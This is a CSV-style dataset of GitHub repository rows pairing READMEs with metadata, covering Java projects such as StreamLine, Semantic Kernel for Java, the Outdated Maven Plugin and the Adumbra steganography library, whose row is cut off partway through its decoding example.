FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```
",0,1,1,mit,0.0,"['lite', 'etl', 'lite', 'etl', 'etl', 'writer', 'etl', 'etl', 'java', 'java', 'pre', 'processor', 'lite', 'etl', 'data', 'update', 'time', 'subscriber', 'lite', 'etl', 'polling', 'transformer', 'lite', 'etl', 'llm', 'transformer', 'llm', 'prompt', 'data', 'verifier', 'data', 'value', 'fuzzy', 'final', 'writer', 'lite', 'etl', 'bug', 'fork', 'github', 'fork', 'github', 'github', 'pull', 'lite', 'etl', 'mit']","['etl', 'lite', 'data', 'github', 'writer']",1,0,0,"['lite', 'etl', 'pre', 'processor', 'subscriber', 'transformer', 'writer']",11,"['lite', 'etl', 'pre', 'processor', 'subscriber']",7,0.0,1.0,[],0.0,1.0,0.0,4620,56.3,5.902309058614565,"['开源协议 -> https://img.shields.io/github/license/WolfLink-DevTeam/lite-etl?style=for-the-badge', 'Stars -> https://img.shields.io/github/stars/WolfLink-DevTeam/lite-etl?style=for-the-badge', 'Last Commit -> https://img.shields.io/github/last-commit/WolfLink-DevTeam/lite-etl?style=for-the-badge', '![Star History Chart -> https://api.star-history.com/svg?repos=WolfLink-DevTeam/lite-etl&type=Date', 'image -> https://github.com/WolfLink-DevTeam/lite-etl/blob/master/img/Pipeline%20Architecture.png']",5
oussemamansouri/Labs-Spring-Boot-for-campusna,main,"# Labs Spring Boot for campusna 
 This repository contains the Labs Spring Boot project for campusna at elife Formation. It is designed to provide hands-on learning experiences with Spring Boot, a powerful and versatile framework for building Java-based web applications and microservices. The project includes various labs and exercises to help developers gain practical skills and deepen their understanding of Spring Boot's core features and best practices.
",0,0,1,mit,0.0,"['lab', 'spring', 'boot', 'campusna', 'repository', 'contains', 'lab', 'spring', 'boot', 'project', 'campusna', 'elife', 'formation', 'designed', 'provide', 'learning', 'experience', 'spring', 'boot', 'powerful', 'versatile', 'framework', 'building', 'web', 'application', 'microservices', 'project', 'includes', 'various', 'lab', 'exercise', 'help', 'developer', 'gain', 'practical', 'skill', 'deepen', 'understanding', 'spring', 'boot', 'core', 'feature', 'best', 'practice']","['spring', 'boot', 'lab', 'campusna', 'project']",0,0,0,"['lab', 'spring', 'boot', 'campusna']",1,"['lab', 'spring', 'boot', 'campusna']",0,0.0,9.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,9.0,0.0,461,23.0,5.565217391304348,[],0
YunaBraska/streamline,main,"# StreamLine

StreamLine is an enhanced Java Stream API optimized for concurrent processing, leveraging the power of Project Loom's
virtual threads. Designed to provide superior performance in multithreaded environments, it simplifies the usage of
streams without the common pitfalls of resource management in standard Java streams.

[![Build][build_shield]][build_link]
[![Maintainable][maintainable_shield]][maintainable_link]
[![Coverage][coverage_shield]][coverage_link]
[![Issues][issues_shield]][issues_link]
[![Commit][commit_shield]][commit_link]
[![Dependencies][dependency_shield]][dependency_link]
[![License][license_shield]][license_link]
[![Central][central_shield]][central_link]
[![Tag][tag_shield]][tag_link]
[![Javadoc][javadoc_shield]][javadoc_link]
[![Size][size_shield]][size_shield]
![Label][label_shield]
![Label][java_version]

## Motivation

Traditional Java streams are powerful but also come with big limits cause of the shared ForkedJoinPool which is not
replaceable and also not programmatically configurable.
Java's parallel streams start blocking each other in concurrent environments, leading to performance bottlenecks.
Therefore, StreamLine was created to address these shortcomings.

### Benefits

- **High-Performance Streaming**: Takes full advantage of Project Loom's virtual threads for efficient non-blocking
  concurrency.
- **Simple API**: Offers a straightforward approach to parallel and asynchronous streaming operations.
- **Resource Management**: Designed to avoid typical issues related to stream resource management, ensuring cleaner and
  safer code.
- **Enhanced Scalability**: Performs exceptionally well under high-load conditions, scaling effectively across multiple
  cores.
- **Pure Java**: No external dependencies for a lightweight integration.
- **Functional Design**: Embraces modern Java functional paradigms.
- **No Reflection**: Ensures compatibility with GraalVM native images.

### Prerequisites

* Java 21 or later and for using Project Loom

### Usage

```java
import berlin.yuna.streamline.model.StreamLine;

public class Example {
    public static void main(final String[] args) {
        StreamLine.of(""one"", ""two"", ""three"")
            .threads(-1) // Use unlimited threads
            .forEach(System.out::println);
    }
}
```

With custom thread pool:

```java
import berlin.yuna.streamline.model.StreamLine;

import java.util.concurrent.ForkJoinPool;

public class Example {
    public static void main(final String[] args) {
        final ForkJoinPool executor = new ForkJoinPool();
        
        StreamLine.of(executor, ""one"", ""two"", ""three"")
            .threads(-1) // Use unlimited threads
            .forEach(System.out::println);
    }
}
```

### StreamLine Performance

Each method is tested with 10 concurrent streams including 10 tasks for every stream.
CPU cores: 10.

| Method                    | Time  |
|---------------------------|-------|
| Loop \[for]               | 1.86s |
| Java Stream \[Sequential] | 1.86s |
| Java Stream \[Parallel]   | 724ms |
| StreamLine \[Ordered]     | 118ms |
| StreamLine \[Unordered]   | 109ms |
| StreamLine \[2 Threads]   | 512ms |

### Limitations
* StreamLine is not compatible with Java 8
* StreamLine is mainly made for big data processing and not for small data
* The concurrent processing does not extend to operations returning type-specific streams
  like `IntStream`, `LongStream`, `DoubleStream`, `OptionalInt`, `OptionalLong`, `OptionalDouble`, etc.
* StreamLine has more terminal operations than the usual java stream due its simple design - not sure if this is an advantage or disadvantage ^^

[build_shield]: https://github.com/YunaBraska/streamline/workflows/MVN_RELEASE/badge.svg

[build_link]: https://github.com/YunaBraska/streamline/actions?query=workflow%3AMVN_RELEASE

[maintainable_shield]: https://img.shields.io/codeclimate/maintainability/YunaBraska/streamline?style=flat-square

[maintainable_link]: https://codeclimate.com/github/YunaBraska/streamline/maintainability

[coverage_shield]: https://img.shields.io/codeclimate/coverage/YunaBraska/streamline?style=flat-square

[coverage_link]: https://codeclimate.com/github/YunaBraska/streamline/test_coverage

[issues_shield]: https://img.shields.io/github/issues/YunaBraska/streamline?style=flat-square

[issues_link]: https://github.com/YunaBraska/streamline/commits/main

[commit_shield]: https://img.shields.io/github/last-commit/YunaBraska/streamline?style=flat-square

[commit_link]: https://github.com/YunaBraska/streamline/issues

[license_shield]: https://img.shields.io/github/license/YunaBraska/streamline?style=flat-square

[license_link]: https://github.com/YunaBraska/streamline/blob/main/LICENSE

[dependency_shield]: https://img.shields.io/librariesio/github/YunaBraska/streamline?style=flat-square

[dependency_link]: https://libraries.io/github/YunaBraska/streamline

[central_shield]: https://img.shields.io/maven-central/v/berlin.yuna/streamline?style=flat-square

[central_link]:https://search.maven.org/artifact/berlin.yuna/streamline

[tag_shield]: https://img.shields.io/github/v/tag/YunaBraska/streamline?style=flat-square

[tag_link]: https://github.com/YunaBraska/streamline/releases

[javadoc_shield]: https://javadoc.io/badge2/berlin.yuna/streamline/javadoc.svg?style=flat-square

[javadoc_link]: https://javadoc.io/doc/berlin.yuna/streamline

[size_shield]: https://img.shields.io/github/repo-size/YunaBraska/streamline?style=flat-square

[label_shield]: https://img.shields.io/badge/Yuna-QueenInside-blueviolet?style=flat-square

[gitter_shield]: https://img.shields.io/gitter/room/YunaBraska/streamline?style=flat-square

[gitter_link]: https://gitter.im/streamline/Lobby

[java_version]: https://img.shields.io/badge/java-21-blueviolet?style=flat-square
",17,1,1,apache-2.0,0.0,"['streamline', 'streamline', 'enhanced', 'java', 'stream', 'api', 'optimized', 'concurrent', 'processing', 'leveraging', 'power', 'project', 'loom', 'virtual', 'thread', 'designed', 'provide', 'superior', 'performance', 'multithreaded', 'environment', 'simplifies', 'usage', 'stream', 'without', 'common', 'pitfall', 'resource', 'management', 'standard', 'java', 'stream', 'motivation', 'traditional', 'java', 'stream', 'powerful', 'also', 'come', 'big', 'limit', 'cause', 'shared', 'forkedjoinpool', 'replaceable', 'also', 'programmatically', 'configurable', 'java', 'parallel', 'stream', 'start', 'blocking', 'concurrent', 'environment', 'leading', 'performance', 'bottleneck', 'therefore', 'streamline', 'created', 'address', 'shortcoming', 'benefit', 'streaming', 'take', 'full', 'advantage', 'project', 'loom', 'virtual', 'thread', 'efficient', 'concurrency', 'simple', 'api', 'offer', 'straightforward', 'approach', 'parallel', 'asynchronous', 'streaming', 'operation', 'resource', 'management', 'designed', 'avoid', 'typical', 'issue', 'related', 'stream', 'resource', 'management', 'ensuring', 'cleaner', 'safer', 'code', 'enhanced', 'scalability', 'performs', 'exceptionally', 'well', 'condition', 'scaling', 'effectively', 'across', 'multiple', 'core', 'pure', 'java', 'external', 'dependency', 'lightweight', 'integration', 'functional', 'design', 'embrace', 'modern', 'java', 'functional', 'paradigm', 'reflection', 'ensures', 'compatibility', 'graalvm', 'native', 'image', 'prerequisite', 'java', 'later', 'using', 'project', 'loom', 'usage', 'custom', 'thread', 'pool', 'streamline', 'performance', 'method', 'tested', 'concurrent', 'stream', 'including', 'task', 'every', 'stream', 'cpu', 'core', 'method', 'time', 'loop', 'java', 'stream', 'sequential', 'java', 'stream', 'parallel', 'streamline', 'ordered', 'streamline', 'unordered', 'streamline', 'thread', 'limitation', 'streamline', 'compatible', 'java', 'streamline', 'mainly', 'made', 'big', 'data', 'processing', 'small', 'data', 'concurrent', 'processing', 'extend', 'operation', 'returning', 'stream', 'like', 'etc', 'streamline', 'terminal', 'operation', 'usual', 'java', 'stream', 'due', 'simple', 'design', 'sure', 'advantage', 'disadvantage']","['stream', 'java', 'streamline', 'concurrent', 'thread']",2,0,0,"['streamline', 'motivation', 'benefit', 'prerequisite', 'usage', 'streamline', 'performance', 'limitation']",7,"['streamline', 'motivation', 'benefit', 'prerequisite', 'usage']",2,1.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-release-plugin,org.apache.maven.plugins:maven-scm-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.jacoco:jacoco-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,1.0,0.0,5794,23.17241379310345,6.561011904761905,"['build_link', 'maintainable_link', 'coverage_link', 'issues_link', 'commit_link', 'dependency_link', 'license_link', 'central_link', 'tag_link', 'javadoc_link', 'size_shield', 'Label -> label_shield', 'Label -> java_version', 'for', 'Sequential', 'Parallel', 'Ordered', 'Unordered', '2 Threads', 'build_shield', 'build_link', 'maintainable_shield', 'maintainable_link', 'coverage_shield', 'coverage_link', 'issues_shield', 'issues_link', 'commit_shield', 'commit_link', 'license_shield', 'license_link', 'dependency_shield', 'dependency_link', 'central_shield', 'central_link', 'tag_shield', 'tag_link', 'javadoc_shield', 'javadoc_link', 'size_shield', 'label_shield', 'gitter_shield', 'gitter_link', 'java_version']",44
microsoft/semantic-kernel-java,main,"[![Builds](https://github.com/microsoft/semantic-kernel-java/actions/workflows/java-build.yml/badge.svg?branch=main)](https://github.com/microsoft/semantic-kernel-java/actions/workflows/java-build.yml)
[![License: MIT](https://img.shields.io/github/license/microsoft/semantic-kernel)](https://github.com/microsoft/semantic-kernel-java/blob/main/LICENSE)
[![Discord](https://img.shields.io/discord/1063152441819942922?label=Discord&logo=discord&logoColor=white&color=d82679)](https://aka.ms/SKDiscord)

# Semantic Kernel for Java

Welcome to the Semantic Kernel for Java. For detailed documentation, visit [Microsoft Learn](https://learn.microsoft.com/en-us/semantic-kernel/overview/?tabs=Java&pivots=programming-language-java).

[Semantic Kernel](https://learn.microsoft.com/en-us/semantic-kernel/overview/) is an SDK that integrates Large Language Models (LLMs) like [OpenAI](https://platform.openai.com/docs/introduction), [Azure OpenAI](https://azure.microsoft.com/en-us/products/ai-services/openai-service), and [Hugging Face](https://huggingface.co/)
with conventional programming languages like C#, Python, and Java. Semantic Kernel achieves this by allowing you to define [plugins](https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/plugins??tabs=Java&pivots=programming-language-java) that can be chained together in just a [few lines of code](https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/chaining-functions?tabs=Java&pivots=programming-language-java#using-the-runasync-method-to-simplify-your-code).

What makes Semantic Kernel _special_, however, is its ability to _automatically_ orchestrate plugins with AI. With Semantic Kernel [planners](https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/planner?tabs=Java&pivots=programming-language-java), you can ask an LLM to generate a plan that achieves a user's unique goal. Afterwards, Semantic Kernel will execute the plan for the user.

For C#, Python and other language support, see [microsoft/semantic-kernel](https://github.com/microsoft/semantic-kernel).

#### Please star the repo to show your support for this project!

![Orchestrating plugins with planner](https://learn.microsoft.com/en-us/semantic-kernel/media/kernel-infographic.png)

## Getting started with Semantic Kernel for Java

The quickest way to get started with the basics is to get an API key from either OpenAI or Azure OpenAI and to run one of the Java console applications/scripts below.

1. Clone the repository: `git clone https://github.com/microsoft/semantic-kernel-java.git`
2. Follow the instructions [Start learning how to use Semantic Kernel](https://learn.microsoft.com/en-us/semantic-kernel/get-started/quick-start-guide?tabs=Java&pivots=programming-language-java).

## Documentation: Learning how to use Semantic Kernel

The fastest way to learn how to use Semantic Kernel is with our walkthroughs
on our Learn site.

1. 📖 [Overview of the kernel](https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/?tabs=Java&pivots=programming-language-java)
1. 🔌 [Understanding AI plugins](https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/plugins?tabs=Java&pivots=programming-language-java)
1. 👄 [Creating semantic functions](https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/semantic-functions?tabs=Java&pivots=programming-language-java)
1. 💽 [Creating native functions](https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/native-functions?tabs=Java&pivots=programming-language-java)
1. ⛓️ [Chaining functions together](https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/chaining-functions?tabs=Java&pivots=programming-language-java)
1. 🤖 [Auto create plans with planner](https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/planner?tabs=Java&pivots=programming-language-java)
1. 💡 [Create and run a ChatGPT plugin](https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/chatgpt-plugins?tabs=Java&pivots=programming-language-java)

## Join the community

We welcome your contributions and suggestions to SK community! One of the easiest
ways to participate is to engage in discussions in the GitHub repository.
Bug reports and fixes are welcome!

For new features, components, or extensions, please open an issue and discuss with
us before sending a PR. This is to avoid rejection as we might be taking the core
in a different direction, but also to consider the impact on the larger ecosystem.

To learn more and get started:

- Read the [documentation](https://learn.microsoft.com/en-us/semantic-kernel/overview/?tabs=Java&pivots=programming-language-java)
- Learn how to [contribute](https://learn.microsoft.com/en-us/semantic-kernel/support/contributing?tabs=Java&pivots=programming-language-java) to the project
- Join the [Discord community](https://aka.ms/SKDiscord)
- Attend [regular office hours and SK community events](COMMUNITY.md)
- Follow the team on our [blog](https://aka.ms/sk/blog)

## Contributor Wall of Fame

[![semantic-kernel contributors](https://contrib.rocks/image?repo=microsoft/semantic-kernel-java)](https://github.com/microsoft/semantic-kernel-java/graphs/contributors)

## Code of Conduct

This project has adopted the
[Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/).
For more information see the
[Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/)
or contact [opencode@microsoft.com](mailto:opencode@microsoft.com)
with any additional questions or comments.

## License

Copyright (c) Microsoft Corporation. All rights reserved.

Licensed under the [MIT](LICENSE) license.
",4,65,7,mit,93.0,"['semantic', 'kernel', 'java', 'welcome', 'semantic', 'kernel', 'java', 'detailed', 'documentation', 'visit', 'microsoft', 'learn', 'semantic', 'kernel', 'sdk', 'integrates', 'large', 'language', 'model', 'llm', 'like', 'openai', 'azure', 'openai', 'hugging', 'face', 'conventional', 'programming', 'language', 'like', 'c', 'python', 'java', 'semantic', 'kernel', 'achieves', 'allowing', 'define', 'plugins', 'chained', 'together', 'line', 'code', 'make', 'semantic', 'kernel', 'special', 'however', 'ability', 'automatically', 'orchestrate', 'plugins', 'ai', 'semantic', 'kernel', 'planner', 'ask', 'llm', 'generate', 'plan', 'achieves', 'user', 'unique', 'goal', 'afterwards', 'semantic', 'kernel', 'execute', 'plan', 'user', 'c', 'python', 'language', 'support', 'see', 'please', 'star', 'repo', 'show', 'support', 'project', 'getting', 'started', 'semantic', 'kernel', 'java', 'quickest', 'way', 'get', 'started', 'basic', 'get', 'api', 'key', 'either', 'openai', 'azure', 'openai', 'run', 'one', 'java', 'console', 'clone', 'repository', 'follow', 'instruction', 'start', 'learning', 'use', 'semantic', 'kernel', 'documentation', 'learning', 'use', 'semantic', 'kernel', 'fastest', 'way', 'learn', 'use', 'semantic', 'kernel', 'walkthroughs', 'learn', 'site', 'overview', 'kernel', 'understanding', 'ai', 'plugins', 'creating', 'semantic', 'function', 'creating', 'native', 'function', 'chaining', 'function', 'together', 'auto', 'create', 'plan', 'planner', 'create', 'run', 'chatgpt', 'plugin', 'join', 'community', 'welcome', 'contribution', 'suggestion', 'sk', 'community', 'one', 'easiest', 'way', 'participate', 'engage', 'discussion', 'github', 'repository', 'bug', 'report', 'fix', 'welcome', 'new', 'feature', 'component', 'extension', 'please', 'open', 'issue', 'discus', 'u', 'sending', 'pr', 'avoid', 'rejection', 'might', 'taking', 'core', 'different', 'direction', 'also', 'consider', 'impact', 'larger', 'ecosystem', 'learn', 'get', 'started', 'read', 'documentation', 'learn', 'contribute', 'project', 'join', 'discord', 'community', 'attend', 'regular', 'office', 'hour', 'sk', 'community', 'event', 'follow', 'team', 'blog', 'contributor', 'wall', 'fame', 'code', 'conduct', 'project', 'adopted', 'microsoft', 'open', 'source', 'code', 'conduct', 'information', 'see', 'code', 'conduct', 'faq', 'contact', 'opencode', 'additional', 'question', 'comment', 'license', 'copyright', 'c', 'microsoft', 'corporation', 'right', 'reserved', 'licensed', 'mit', 'license']","['semantic', 'kernel', 'java', 'learn', 'openai']",0,0,0,"['semantic', 'kernel', 'java', 'please', 'star', 'repo', 'show', 'support', 'project', 'get', 'start', 'semantic', 'kernel', 'java', 'documentation', 'learning', 'use', 'semantic', 'kernel', 'join', 'community', 'contributor', 'wall', 'fame', 'code', 'conduct', 'license']",8,"['semantic', 'kernel', 'java', 'please', 'star']",0,157.0,23.0,"[com.diffplug.spotless:spotless-maven-plugin,com.github.spotbugs:spotbugs-maven-plugin,maven-assembly-plugin,org.apache.maven.plugins:maven-antrun-plugin,org.apache.maven.plugins:maven-changes-plugin,org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-install-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-jxr-plugin,org.apache.maven.plugins:maven-pmd-plugin,org.apache.maven.plugins:maven-project-info-reports-plugin,org.apache.maven.plugins:maven-release-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-site-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.apache.rat:apache-rat-plugin,org.codehaus.mojo:animal-sniffer-maven-plugin,org.codehaus.mojo:exec-maven-plugin,org.codehaus.mojo:license-maven-plugin,org.codehaus.mojo:versions-maven-plugin,org.commonjava.maven.plugins:directory-maven-plugin,org.jacoco:jacoco-maven-plugin,org.mutabilitydetector:MutabilityDetector4FindBugs]",0.0,16.0,7.0,5661,22.54054054054054,5.407673860911271,"['![Builds -> https://github.com/microsoft/semantic-kernel-java/actions/workflows/java-build.yml/badge.svg?branch=main', '![License: MIT -> https://img.shields.io/github/license/microsoft/semantic-kernel', '![Discord -> https://img.shields.io/discord/1063152441819942922?label=Discord&logo=discord&logoColor=white&color=d82679', 'Microsoft Learn -> https://learn.microsoft.com/en-us/semantic-kernel/overview/?tabs=Java&pivots=programming-language-java', 'Semantic Kernel -> https://learn.microsoft.com/en-us/semantic-kernel/overview/', 'OpenAI -> https://platform.openai.com/docs/introduction', 'Azure OpenAI -> https://azure.microsoft.com/en-us/products/ai-services/openai-service', 'Hugging Face -> https://huggingface.co/', 'plugins -> https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/plugins??tabs=Java&pivots=programming-language-java', 'few lines of code -> https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/chaining-functions?tabs=Java&pivots=programming-language-java#using-the-runasync-method-to-simplify-your-code', 'planners -> https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/planner?tabs=Java&pivots=programming-language-java', 'microsoft/semantic-kernel -> https://github.com/microsoft/semantic-kernel', 'Orchestrating plugins with planner -> https://learn.microsoft.com/en-us/semantic-kernel/media/kernel-infographic.png', 'Start learning how to use Semantic Kernel -> https://learn.microsoft.com/en-us/semantic-kernel/get-started/quick-start-guide?tabs=Java&pivots=programming-language-java', 'Overview of the kernel -> https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/?tabs=Java&pivots=programming-language-java', 'Understanding AI plugins -> https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/plugins?tabs=Java&pivots=programming-language-java', 'Creating semantic functions -> https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/semantic-functions?tabs=Java&pivots=programming-language-java', 'Creating native functions -> https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/native-functions?tabs=Java&pivots=programming-language-java', 'Chaining functions together -> https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/chaining-functions?tabs=Java&pivots=programming-language-java', 'Auto create plans with planner -> https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/planner?tabs=Java&pivots=programming-language-java', 'Create and run a ChatGPT plugin -> https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/chatgpt-plugins?tabs=Java&pivots=programming-language-java', 'documentation -> https://learn.microsoft.com/en-us/semantic-kernel/overview/?tabs=Java&pivots=programming-language-java', 'contribute -> https://learn.microsoft.com/en-us/semantic-kernel/support/contributing?tabs=Java&pivots=programming-language-java', 'Discord community -> https://aka.ms/SKDiscord', 'blog -> https://aka.ms/sk/blog', '![semantic-kernel contributors -> https://contrib.rocks/image?repo=microsoft/semantic-kernel-java', 'Microsoft Open Source Code of Conduct -> https://opensource.microsoft.com/codeofconduct/', 'Code of Conduct FAQ -> https://opensource.microsoft.com/codeofconduct/faq/']",28
Giovds/outdated-maven-plugin,main,"# The Outdated Maven Plugin

> Stay up-to-date and secure with The Outdated Maven Plugin!

The Outdated Maven Plugin is a tool designed to help developers identify outdated dependencies in their Maven projects.
By scanning the dependencies of your project, this plugin determines if they are no longer actively maintained
based on a user-defined threshold of inactivity in years. This ensures that your project remains up-to-date with the
latest and most secure versions of its dependencies.

## Usage

You can use the plugin as standalone for a quick check by simply running the following command in your favourite
project:\
`mvn com.giovds:outdated-maven-plugin:check -Dyears=<number_of_years>`

Or you can use the plugin to get the average and total age of all the dependencies in your project:\
`mvn com.giovds:outdated-maven-plugin:average`

Alternatively, you can integrate the plugin into your Maven project by adding the following configuration to your `pom.xml` file:
```xml

<build>
    <plugins>
        <plugin>
            <groupId>com.giovds</groupId>
            <artifactId>outdated-maven-plugin</artifactId>
            <version>1.3.0</version>
            <configuration>
                <!-- The maximum amount of inactive years allowed -->
                <years>1</years>
                <!-- Whether to fail the build if an outdated dependency is found -->
                <shouldFailBuild>false</shouldFailBuild>
            </configuration>
            <executions>
                <execution>
                    <id>outdated-check</id>
                    <goals>
                        <goal>check</goal>
                    </goals>
                </execution>
            </executions>
        </plugin>
    </plugins>
</build>
```

## Contributing

Contributions are welcome! \
Please verify if a similar issue is not reported already. If it is not create one, if it is.

## License

This project is licensed under the MIT License - see the [LICENSE](./LICENSE) file for details.
",2,5,3,mit,21.0,"['outdated', 'maven', 'plugin', 'stay', 'secure', 'outdated', 'maven', 'plugin', 'outdated', 'maven', 'plugin', 'tool', 'designed', 'help', 'developer', 'identify', 'outdated', 'dependency', 'maven', 'project', 'scanning', 'dependency', 'project', 'plugin', 'determines', 'longer', 'actively', 'maintained', 'based', 'threshold', 'inactivity', 'year', 'ensures', 'project', 'remains', 'latest', 'secure', 'version', 'dependency', 'usage', 'use', 'plugin', 'standalone', 'quick', 'check', 'simply', 'running', 'following', 'command', 'favourite', 'project', 'use', 'plugin', 'get', 'average', 'total', 'age', 'dependency', 'project', 'alternatively', 'integrate', 'plugin', 'maven', 'project', 'adding', 'following', 'configuration', 'file', 'contributing', 'contribution', 'welcome', 'please', 'verify', 'similar', 'issue', 'reported', 'already', 'create', 'one', 'license', 'project', 'licensed', 'mit', 'license', 'see', 'license', 'file', 'detail']","['plugin', 'project', 'maven', 'outdated', 'dependency']",0,0,0,"['the', 'outdated', 'maven', 'plugin', 'usage', 'contribute', 'license']",4,"['the', 'outdated', 'maven', 'plugin', 'usage']",1,13.0,1.0,"[com.diffplug.spotless:spotless-maven-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-install-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-plugin-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.jreleaser:jreleaser-maven-plugin]",0.0,0.0,0.0,2012,32.0,5.19140625,[],0
galliumdata/adumbra,master,"# The Adumbra library
Adumbra is a light-weight Java library that uses
[steganography](https://en.wikipedia.org/wiki/Steganography)
to hide data in bitmaps using a secret key. 
Supported input formats include PNG, JPEG, TIFF, BMP.
Output formats are PNG and TIFF only, because other
formats are lossy and therefore more difficult to support.

Adumbra requires a bitmap with about 500 pixels
for every byte of the secret message, so a bitmap of
500x700 pixels could contain a secret message 
of up to about 700 bytes. The maximum size of the secret
message is 32K bytes.

Adumbra is intended to be used as more of a way
to mark bitmaps in a non-obvious way, rather than as 
an efficient way to transmit large amounts of secret data.

## How does it work?
Adumbra hides a secret message in a bitmap by distributing
the message's bits into the least significant bit of some pixels,
using one color per pixel (R, G or B) in a pattern
determined by the secret key.

Before being encoded into the bitmap, the message is 
encrypted using a secure hash of the secret key.

Adumbra can also randomize the least significant bits 
of other pixels to make it more difficult to determine 
whether the bitmap contains a secret message, and 
how long that message may be. With that option,
even if someone had access to the original bitmap,
they still would not be able to decode the secret message
without the secret key because they could not determine
if a changed bit belongs to the secret message or is just noise.

## How secure is this?
This library has not been reviewed by cryptography experts,
so you should exercise common sense -- do not rely on it
to hide national security secrets.

As always with encryption, the length of the secret key is
important: using a short key is less secure than a longer key.
The randomness of the key is also a factor. In general,
using a secret key of at least 40 random characters should
give you excellent secrecy. If you just want to mark a bitmap in a non-obvious
way without worrying about NSA-level adversaries, 15 or 20
random characters should be plenty.

There are two main obstacles to decoding a secret message:
### Determining that a bitmap contains a message
An attacker who analyzes the modified bitmap may be able to determine
that the bitmap contains some suspicious noise, but it would be
difficult to be certain unless they have access to the original
bitmap.
### Decoding the secret message
Even with the original bitmap, without the secret key, 
an attacker would have a difficult time to
figure out which bits actually belong to the secret message.
Even if they did, they would then have to decrypt the message,
which is encoded using a SHA-512 hash of the secret key.

## Removing the secret message
Keep in mind that it is fairly easy to scramble a secret message
hidden in a bitmap -- all you have to do is save the bitmap
with a bit of compression. In most cases, that will make the
secret message unrecognizable.

## Command line usage
### Encoding a message in a bitmap
```
java -jar adumbra-<version>.jar encode \
    <input-file> \
    <output-file> \
    <message> \
    <key> \
    [<format> [<secure-level>]]
```
- `<input-file>`: a bitmap file. 
Supported input formats are those supported by your Java platform,
and usually include: `png`, `jpeg`, `tiff`, `bmp`
- `<output-file>`: the file in which to write the bitmap 
with the hidden message
- `<message>`: the message to be encoded in the bitmap
- `<key>`: the secret key used to hide the message
- `<format>`: optional, the format of the output file. 
If not specified, the format of the input file will be used,
but only ""png"" and ""tiff"" are allowed because other formats
are lossy.
- `<secure-level>`: optional, an integer between 0 and 2.
Zero means minimum security, no noise is added to the image,
which means, depending on the bitmap, it may be easy to
detect that the image contains secret data, and how long that
data is. One adds some noise, but with some repetition,
making it much more difficult to determine that the bitmap 
contains secret data. Two adds fully random noise, which is
even more secure, but is somewhat slower.

### Example
Encode a message into a bitmap file:
```
java -jar adumbra-0.9.jar encode MyImage.jpeg Output.png \
    ""My secret message"" ""6buovMtowrAuNYw"" png 1
```
## Extract a secret message from a bitmap file:
```
java -jar adumbra-0.8.jar decode Output.png \
""6buovMtowrAuNYw""
```
Output:
```
Hidden message: My secret message
```

## Library usage
This is a stand-alone library, it has no dependencies.

[Javadoc is here](https://javadoc.io/doc/com.galliumdata.adumbra/adumbra/latest/com/galliumdata/adumbra/package-summary.html)

### Maven:
```
<dependency>
    <groupId>com.galliumdata.adumbra</groupId>
    <artifactId>adumbra</artifactId>
    <version>0.9</version>
</dependency>
```
### Encoding in Java
```
Encoder encoder = new Encoder(2);
FileInputStream inStr = new FileInputStream(""MyImage.jpg"");
FileOutputStream outStr = new FileOutputStream(""ModifImage.png"");
byte[] message = ""This is the message"".getBytes(StandardCharsets.UTF_8);
String key = ""This is the secret key"";
encoder.encode(inStr, outStr,  ""png"", message, key, ""png"", 1);
outStr.close();
// Result is in file ModifImage.png
```

### Decoding in Java
```
Decoder decoder = new Decoder();
FileInputStream inStr = new FileInputStream(""ModifImage.png"");
byte[] decoded = decoder.decode(inStr, ""This is the secret key"");
System.out.println(new String(decoded));
